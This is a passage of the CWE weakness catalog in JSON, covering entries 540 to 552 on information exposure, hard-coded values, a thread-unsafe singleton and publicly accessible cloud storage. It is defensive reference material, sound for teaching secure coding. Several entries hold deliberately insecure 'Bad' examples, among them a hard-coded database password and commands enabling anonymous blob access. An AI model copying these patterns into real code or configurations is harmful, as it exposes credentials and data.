            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not store sensitive information in persistent cookies."
        }
      ],
      "RelatedAttackPatterns": [
        "21",
        "31",
        "39",
        "59",
        "60"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "540",
      "Name": "Inclusion of Sensitive Information in Source Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Source code on a web server or repository often contains sensitive information and should generally not be accessible to users.",
      "ExtendedDescription": "There are situations where it is critical to remove source code from an area or server. For example, obtaining Perl source code on a system allows an attacker to understand the logic of the script and extract extremely useful information such as code bugs or logins and passwords.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "538",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "System Configuration"
          ],
          "Description": "Recommendations include removing this script from the web server and moving it to a location not accessible from the Internet."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-104",
          "Entries": [
            {
              "IntroText": "The following code uses an include file to store database credentials:"
            },
            {
              "BodyText": "database.inc"
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t<?php\n\t$dbName = 'usersDB';\n\t$dbPassword = 'skjdh#67nkjd3$3$';\n\t?>\n```"
            },
            {
              "BodyText": "login.php"
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t<?php\n\tinclude('database.inc');\n\t$db = connectToDB($dbName, $dbPassword);\n\t$db.authenticateUser($username, $password);\n\t?>\n```"
            },
            {
              "BodyText": "If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following comment, embedded in a JSP, will be displayed in the resulting HTML output."
            },
            {
              "Nature": "Bad",
              "Language": "JSP",
              "ExampleCode": "```\n\t<!-- FIXME: calling this with more than 30 args kills the JDBC server -->\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-25512",
          "Description": "Server for Team Awareness Kit (TAK) application includes sensitive tokens in the JavaScript source code.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-25512"
        },
        {
          "Reference": "CVE-2022-24867",
          "Description": "The LDAP password might be visible in the html code of a rendered page in an IT Asset Management tool.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-24867"
        },
        {
          "Reference": "CVE-2007-6197",
          "Description": "Version numbers and internal hostnames leaked in HTML comments.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6197"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "541",
      "Name": "Inclusion of Sensitive Information in an Include File",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "If an include file source is accessible, the file can contain usernames and passwords, as well as sensitive information pertaining to the application and system.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "540",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not store sensitive information in include files."
        },
        {
          "Phase": [
            "Architecture and Design",
            "System Configuration"
          ],
          "Description": "Protect include files from being exposed."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-104",
          "Entries": [
            {
              "IntroText": "The following code uses an include file to store database credentials:"
            },
            {
              "BodyText": "database.inc"
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t<?php\n\t$dbName = 'usersDB';\n\t$dbPassword = 'skjdh#67nkjd3$3$';\n\t?>\n```"
            },
            {
              "BodyText": "login.php"
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t<?php\n\tinclude('database.inc');\n\t$db = connectToDB($dbName, $dbPassword);\n\t$db.authenticateUser($username, $password);\n\t?>\n```"
            },
            {
              "BodyText": "If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "542",
      "Name": "DEPRECATED: Information Exposure Through Cleanup Log Files",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Deprecated",
      "Description": "This entry has been deprecated because its abstraction was too low-level.  See CWE-532.",
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This CWE has been deprecated.",
        "Comments": "See description and name for possible suggestions of other CWEs to consider.",
        "Reasons": [
          "Deprecated"
        ]
      }
    },
    {
      "ID": "543",
      "Name": "Use of Singleton Pattern Without Synchronization in a Multithreaded Context",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses the singleton pattern when creating a resource within a multithreaded environment.",
      "ExtendedDescription": "The use of a singleton pattern may not be thread-safe.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "820",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other",
            "Integrity"
          ],
          "Impact": [
            "Other",
            "Modify Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use the Thread-Specific Storage Pattern. See References."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Do not use member fields to store information in the Servlet. In multithreading environments, storing user data in Servlet member fields introduces a data access race condition."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Avoid using the double-checked locking pattern in language versions that cannot guarantee thread safety. This pattern may be used to avoid the overhead of a synchronized call, but in certain versions of Java (for example), this has been shown to be unsafe because it still introduces a race condition (CWE-209).",
          "Effectiveness": "Limited"
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This method is part of a singleton pattern, yet the following singleton() pattern is not thread-safe. It is possible that the method will create two objects instead of only one."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate static NumberConverter singleton;\n\tpublic static NumberConverter get_singleton() {\n\t\tif (singleton == null) {\n\t\t\tsingleton = new NumberConverter();\n\t\t}\n\t\treturn singleton;\n\t}\n```"
            },
            {
              "BodyText": "Consider the following course of events:"
            },
            {
              "BodyText": "- Thread A enters the method, finds singleton to be null, begins the NumberConverter constructor, and then is swapped out of execution.\n\n  - Thread B enters the method and finds that singleton remains null. This will happen if A was swapped out during the middle of the constructor, because the object reference is not set to point at the new object on the heap until the object is fully initialized.\n\n  - Thread B continues and constructs another NumberConverter object and returns it while exiting the method.\n\n  - Thread A continues, finishes constructing its NumberConverter object, and returns its version."
            },
            {
              "BodyText": "At this point, the threads have created and returned two different objects."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MSC07-J",
          "EntryName": "Prevent multiple instantiations of singleton objects"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP19",
          "EntryName": "Missing Lock"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-474",
          "Authors": [
            "Douglas C. Schmidt",
            "Timothy H. Harrison",
            "Nat Pryce"
          ],
          "Title": "Thread-Specifc Storage for C/C++",
          "URL": "http://www.cs.wustl.edu/~schmidt/PDF/TSS-pattern.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "544",
      "Name": "Missing Standardized Error Handling Mechanism",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.",
      "ExtendedDescription": "If the product handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. The causes of errors may be lost. Also, detailed information about the causes of an error may be unintentionally returned to the user.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "755",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Quality Degradation",
            "Unexpected State",
            "Varies by Context"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "define a strategy for handling errors of different severities, such as fatal errors versus basic log events. Use or create built-in language features, or an external package, that provides an easy-to-use API and define coding standards for the detection and handling of errors."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ERR00-C",
          "EntryName": "Adopt and implement a consistent and comprehensive error-handling policy"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "545",
      "Name": "DEPRECATED: Use of Dynamic Class Loading",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Deprecated",
      "Description": "This weakness has been deprecated because it partially overlaps CWE-470, it describes legitimate programmer behavior, and other portions will need to be integrated into other entries.",
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This CWE has been deprecated.",
        "Comments": "See description and name for possible suggestions of other CWEs to consider.",
        "Reasons": [
          "Deprecated"
        ]
      }
    },
    {
      "ID": "546",
      "Name": "Suspicious Comment",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code contains comments that suggest the presence of bugs, incomplete functionality, or weaknesses.",
      "ExtendedDescription": "Many suspicious comments, such as BUG, HACK, FIXME, LATER, LATER2, TODO, in the code indicate missing security functionality and checking. Others indicate code problems that programmers should fix, such as hard-coded variables, error handling, not using stored procedures, and performance issues.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1078",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ],
          "Note": "Suspicious comments could be an indication that there are problems in the source code that may need to be fixed and is an indication of poor quality. This could lead to further bugs and the introduction of weaknesses."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Documentation"
          ],
          "Description": "Remove comments that suggest the presence of bugs, incomplete functionality, or weaknesses, before deploying the application."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following excerpt demonstrates the use of a suspicious comment in an incomplete code block that may have security repercussions."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tif (user == null) {\n```\n// TODO: Handle null user condition.* \n\t\t\t}"
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "547",
      "Name": "Use of Hard-coded, Security-relevant Constants",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.",
      "ExtendedDescription": "If the developer does not find all occurrences of the hard-coded constants, an incorrect policy decision may be made if one of the constants is not changed. Making changes to these values will require code changes that may be difficult or impossible once the system is released to the field. In addition, these hard-coded values may become available to attackers if the code is ever disclosed.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1078",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context",
            "Quality Degradation"
          ],
          "Note": "The existence of hardcoded constants could cause unexpected behavior and the introduction of weaknesses during code maintenance or when making changes to the code if all occurrences are not modified. The use of hardcoded constants is an indication of poor quality."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Avoid using hard-coded constants. Configuration files offer a more flexible solution."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-215",
          "Entries": [
            {
              "IntroText": "The usage of symbolic names instead of hard-coded constants is preferred."
            },
            {
              "BodyText": "The following is an example of using a hard-coded constant instead of a symbolic name."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar buffer[1024];\n\t...\n\tfgets(buffer, 1024, stdin);\n```"
            },
            {
              "BodyText": "If the buffer value needs to be changed, then it has to be altered in more than one place. If the developer forgets or does not find all occurrences, in this example it could lead to a buffer overflow."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tenum { MAX_BUFFER_SIZE = 1024 };\n\t...\n\tchar buffer[MAX_BUFFER_SIZE];\n\t...\n\tfgets(buffer, MAX_BUFFER_SIZE, stdin);\n```"
            },
            {
              "BodyText": "In this example the developer will only need to change one value and all references to the buffer size are updated, as a symbolic name is used instead of a hard-coded constant."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "DCL06-C",
          "EntryName": "Use meaningful symbolic constants to represent literal values in program logic"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "548",
      "Name": "Exposure of Information Through Directory Listing",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.",
      "ExtendedDescription": "A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "497",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Files or Directories"
          ],
          "Note": "Exposing the contents of a directory can lead to an attacker gaining access to source code or providing useful information for the attacker to devise exploits, such as creation times of files or any information that may be encoded in file names. The directory listing may also compromise private or confidential data."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "System Configuration"
          ],
          "Description": "Recommendations include restricting access to important directories or files by adopting a need to know requirement for both the document and server root, and turning off features such as Automatic Directory Listings that could expose private files and provide information that could be utilized by an attacker when formulating or conducting an attack."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A10",
          "EntryName": "Insecure Configuration Management",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "WASC",
          "EntryID": "16",
          "EntryName": "Directory Indexing"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "549",
      "Name": "Missing Password Field Masking",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not mask passwords during entry, increasing the potential for attackers to observe and capture passwords.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "522",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation",
            "Requirements"
          ],
          "Description": "Recommendations include requiring all password fields in your web application be masked to prevent other users from seeing this information."
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 19: Use of Weak Password-Based Systems.\" Page 279",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "550",
      "Name": "Server-generated Error Message Containing Sensitive Information",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Certain conditions, such as network failure, will cause a server error message to be displayed.",
      "ExtendedDescription": "While error messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "209",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "System Configuration"
          ],
          "Description": "Recommendations include designing and adding consistent error handling mechanisms which are capable of handling any user input to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "551",
      "Name": "Incorrect Behavior Order: Authorization Before Parsing and Canonicalization",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection.",
      "ExtendedDescription": "For instance, the character strings /./ and / both mean current directory. If /SomeDirectory is a protected directory and an attacker requests /./SomeDirectory, the attacker may be able to gain access to the resource if /./ is not converted to / before the authorization check is performed.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "863",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "696",
          "ViewID": "1000"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "URL Inputs should be decoded and canonicalized to the application's current internal representation before being validated and processed for authorization. Make sure that your application does not decode the same input twice. Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "552",
      "Name": "Files or Directories Accessible to External Parties",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product makes files or directories accessible to unauthorized actors, even though they should not be.",
      "ExtendedDescription": "\n\nWeb servers, FTP servers, and similar servers may store a set of files underneath a \"root\" directory that is accessible to the server's users. Applications may store sensitive files underneath this root without also using access control to limit which users may request those files, if any. Alternately, an application might package multiple files or directories into an archive file (e.g., ZIP or tar), but the application might not exclude sensitive files that are underneath those directories.\n\n\nIn cloud technologies and containers, this weakness might present itself in the form of misconfigured storage accounts that can be read or written by a public or anonymous user.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "285",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Cloud Computing",
          "Prevalence": "Often"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Operation",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Files or Directories",
            "Modify Files or Directories"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation",
            "System Configuration",
            "Operation"
          ],
          "Description": "When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to disable public access."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-160",
          "Entries": [
            {
              "IntroText": "The following Azure command updates the settings for a storage account:"
            },
            {
              "Nature": "Bad",
              "Language": "Shell",
              "ExampleCode": "```\n\taz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access true\n```"
            },
            {
              "BodyText": "However, \"Allow Blob Public Access\" is set to true, meaning that anonymous/public users can access blobs."
            },
            {
              "BodyText": "The command could be modified to disable \"Allow Blob Public Access\" by setting it to false."
            },
            {
              "Nature": "Good",
              "Language": "Shell",
              "ExampleCode": "```\n\taz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access false\n```"
            }
          ]
        },
        {
          "ID": "DX-161",
          "Entries": [
            {
              "IntroText": "The following Google Cloud Storage command gets the settings for a storage account named 'BUCKET_NAME':"
            },
            {
              "Nature": "Informative",
              "Language": "Shell",
              "ExampleCode": "```\n\t gsutil iam get gs://BUCKET_NAME\n```"
            },
            {
              "BodyText": "Suppose the command returns the following result:"
            },
            {
              "Nature": "Bad",
              "Language": "JSON",
              "ExampleCode": "{\n\n```\n\t \"bindings\":[{\n\t\t \"members\":[\n\t\t\t \"projectEditor: PROJECT-ID\",\n\t\t\t \"projectOwner: PROJECT-ID\" \n\t\t ],\n\t\t \"role\":\"roles/storage.legacyBucketOwner\"\n\t },\n\t {\n\t\t \"members\":[ \n\t\t\t \"allUsers\",\n\t\t\t \"projectViewer: PROJECT-ID\"\n\t\t\t ],\n\t\t\t \"role\":\"roles/storage.legacyBucketReader\"\n\t\t }\n\t ]\n }\n```"
            },
            {
              "BodyText": "This result includes the \"allUsers\" or IAM role added as members, causing this policy configuration to allow public access to cloud storage resources. There would be a similar concern if \"allAuthenticatedUsers\" was present."
            },
            {
              "BodyText": "The command could be modified to remove \"allUsers\" and/or \"allAuthenticatedUsers\" as follows:"
            },
            {
              "Nature": "Good",
              "Language": "Shell",
              "ExampleCode": "gsutil iam ch -d allUsers gs://BUCKET_NAME\n gsutil iam ch -d allAuthenticatedUsers gs://BUCKET_NAME"
            }
